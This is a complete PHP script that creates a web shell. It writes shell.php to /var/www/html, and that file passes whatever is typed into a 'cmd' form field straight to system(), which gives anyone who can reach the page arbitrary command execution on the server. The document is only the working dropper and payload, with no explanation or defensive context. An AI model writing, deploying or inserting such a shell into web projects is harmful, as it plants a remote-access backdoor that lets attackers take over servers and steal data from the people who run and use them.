<?php
$file_content = '<html>
<body>
<form method="GET" name="'.basename($_SERVER['PHP_SELF']).'">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
if(isset($_GET[\'cmd\']))
{
    system($_GET[\'cmd\']);
}
?>
</pre>
</body>
</html>';

$file_path = '/var/www/html/shell.php';

$file = fopen($file_path, 'w') or die("Unable to create file!");

fwrite($file, $file_content);

fclose($file);

echo "File created successfully at ".$file_path;
?>